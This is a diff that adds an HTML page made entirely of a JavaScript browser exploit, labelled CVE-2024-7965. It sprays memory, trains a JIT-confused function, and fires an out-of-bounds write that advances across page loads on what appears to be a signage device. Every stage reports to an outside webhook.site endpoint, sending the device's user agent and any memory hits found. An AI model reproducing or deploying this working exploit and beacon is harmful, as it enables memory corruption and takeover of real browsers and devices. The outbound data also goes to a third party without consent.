@@ -1,0 +1,90 @@
+<html><body><script>
+// esc_stage1: device-side far-write recon (CVE-2024-7965, tahir-controlled)
+// One shot per page load; survives renderer crash via signage reload; progress in localStorage.
+const SINK = 'https://webhook.site/8ef04aba-6afe-4523-972f-67ffeeb88173';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)), {mode:'no-cors'}); } catch(e) {}
+}
+var N = 0;
+try { N = parseInt(localStorage.getItem('esc1_n') || '0', 10); } catch(e) {}
+beacon('load', 'n=' + N + ' ' + navigator.userAgent.slice(0,40));
+
+// small fully-committed spray (fits low-RAM device)
+var NB = 8, SZB = 32 * 1024 * 1024;   // 8 x 32MB = 256MB
+var bufs = [];
+try {
+  for (var b = 0; b < NB; b++) { var u = new Uint32Array(SZB / 4); u.fill(0xABABABAB); bufs.push(u); }
+} catch(e) { beacon('spray-exc', String(e).slice(0,80)); }
+beacon('spray', 'ok ' + NB + 'x32MB');
+
+var arrx = new Array(150);
+arrx[0] = 1.1;
+var fake = new Uint32Array(10);
+fake[0]= 1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
+var tahir = 1;
+
+function poc(a) {
+  var oob_array = new Array(5);
+  oob_array[0] = 0x500;
+  let just_a_variable = fake[0];
+  let another_variable3 = fake[7];
+  if(a % 7 == 0)
+    another_variable3 = 0x100000000;
+  another_variable3 = Math.max(another_variable3,tahir);
+  another_variable3 = another_variable3 >>> 0;
+  var index = fake[3];
+  var for_phi_modes = fake[6];
+  let c = fake[1];
+  for(var i =0;i<10;i++) {
+    if( a % 3 == 0){ just_a_variable = c; }
+    if( a % 37 == 0) { just_a_variable = fake[2]; }
+    if( a % 11 == 0){ just_a_variable = fake[8]; }
+    if( a % 17 == 0){ just_a_variable = fake[5]; }
+    if( a % 19 == 0){ just_a_variable = fake[4]; }
+    if( a % 7 == 0 && i>=5){
+      for_phi_modes = just_a_variable;
+      just_a_variable = another_variable3;
+    }
+    if(i>=6){
+      for(let j=0;j<5;j++){
+        if(a % 5 == 0) {
+          index = for_phi_modes;
+          oob_array[index] = 0x500;
+        }
+      }
+    }
+    for_phi_modes = c;
+    c = just_a_variable;
+  }
+  return [index,BigInt(just_a_variable)];
+}
+
+// deterministic warm: avoid joint a%5==0 && a%7==0 so the bug never fires pre-shot
+var w = 0;
+for (var i = 2; w < 60000; i++) {
+  var a = i % 700;
+  if (a % 5 == 0 && a % 7 == 0) continue;
+  poc(a); w++;
+}
+beacon('warm', 'done ' + w);
+
+// THE SHOT: offset = tahir*4 bytes past elements; step 1GB in index units (4GB in bytes)
+var MAXN = 40;
+var idx = 0x100000000 + N * 0x40000000;
+tahir = idx;
+beacon('shot', 'n=' + N + ' idx=0x' + idx.toString(16));
+try { poc(35); } catch(e) { beacon('shot-exc', String(e).slice(0,80)); }
+tahir = 1;
+beacon('survived', 'n=' + N);
+
+// scan spray for 0xA00
+for (var b = 0; b < bufs.length; b++) {
+  var u = bufs[b];
+  for (var w2 = 0; w2 < u.length; w2++) {
+    if (u[w2] !== 0xABABABAB) { beacon('HIT', 'n=' + N + ' buf=' + b + ' w=' + w2 + ' v=0x' + (u[w2]>>>0).toString(16)); break; }
+  }
+}
+
+try { localStorage.setItem('esc1_n', String(Math.min(N + 1, MAXN))); } catch(e) {}
+beacon('done', 'n=' + N + ' next=' + (N + 1));
+</script></body></html>
